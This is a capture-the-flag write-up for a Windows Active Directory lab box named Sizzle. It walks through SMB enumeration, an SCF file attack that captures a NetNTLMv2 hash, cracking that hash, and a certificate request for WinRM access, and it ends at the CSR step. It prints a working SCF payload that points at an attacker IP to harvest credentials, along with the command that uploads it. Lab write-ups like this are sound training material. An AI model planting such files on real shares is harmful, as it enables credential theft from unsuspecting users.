

#### Background


**Sizzler** is a a really tough windows box. 

#### Enumeration

To begin the enumeration process, a **TCP/UDP** port scan was run against the target using nmap. The purpose of scan is to quickly determine which ports are open and which services are running. 

###### OS Information
Based on the system we know it is running some version of windows server

###### Open Ports:
In addition to usual ports, 22 and 80 UDP port 161 is open. UDP 161 is the standard SNMP port.There is also a filtered ftp port showing.

![source-01](/img/sizzle5.PNG){: .align-left}

#### Notes:
- There are a lot of ports open and by looking at the open ports we know it is most likely a windows active directory setup.

#### HTTP - TCP 80
Gobuster did find an interesting directory **certenroll**  which is microsoft certificate authority enrolement service.
```python

/aspnet_client (Status: 301)
/certenroll (Status: 301)
/Images (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
```
But visiting that directory show us 403 forbidden

![source-01](/img/sizzle1.PNG){: .align-left}



#### SMB - TCP 445
Using SMB client i was able to get bunch of shares.

```python

sizzle smbclient -N -L \\\\sizzle.htb.local

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Operations      Disk
        SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```
Notes:
- From the shares i noticed the CertEnroll which is used by Microsoft Certificate Authority. From my years of experience with managing windows Active directory environments /certsrv 

Visting that directory pop us for a username and password

![source-01](/img/sizzle2.PNG){: .align-left}

So we need a username and password to access /certsrv, lets enumerate the SMB shares further.

There is nothing interesting in department shares and most of the folders are empty. 

![source-01](/img/sizzle4.PNG){: .align-left}

From all the folders we have Full access to  /Users folder.

![source-01](/img/sizzle7.PNG){: .align-left}

#### SMB Share – SCF File Attacks

When we have read/write access to a SMB file share, we can performa a SCF file attack to steal NetNTLMv2 hash.
> 

After uploading the malicious SCF file, we wait for responder 

![source-01](/img/sizzle8.PNG){: .align-left}

And we got user Amanda's NetNTLM Hash

#### Hash Cracking

Feed  the captured hash to hashcat to crack it.

![source-01](/img/sizzle9.PNG){: .align-left}

And we got the password.

#### Certenrol Access
Using the credential for amanda we can login to /cersrv which is Microsoft certificate certificate enrol service.

![source-01](/img/Screenshot_2020-06-21_16-25-23.png){: .align-left}

Great now we can request certificates, why we need a certificate anyway ?. From our initial nmap scans we know winrm port is open which is https, to use this service we need to have a valid certificate.

What is WinRM ?
> Windows Remote Management, or WinRM, is a Windows-native built-in remote management protocol in its simplest form that uses Simple Object Access Protocol to interface with remote computers and servers, as well as Operating Systems and applications.

#### Intial Acess - Compromising User

Now we can use the cersrv portal and request for Certificate Signing Request (CSR).

#### SCF - Attack
SCF payload:

```python

➜  sizzle cat steal.scf
[Shell]
command=2
IconFile=\\10.10.14.36\share\pwn.ico
[Taskbar]
Command=ToggleDesktop
```
upload the SCF file to SMB share
```python

smb: \Users\public\> put steal.scf
putting file steal.scf as \Users\public\steal.scf (0.1 kb/s) (average 0.1 kb/s)
```

#### Certificate Signing Request (CSR)
We can use OpenSSL to generate CSR file 

![source-01](/img/Screenshot_2020-06-21_16-47-07.png){: .align-left}

On the certificate web enrollment page copy/paste the content of the CSR file.

![source-01](/img/Screenshot_2020-06-21_16-55-08.png){: .align-left}













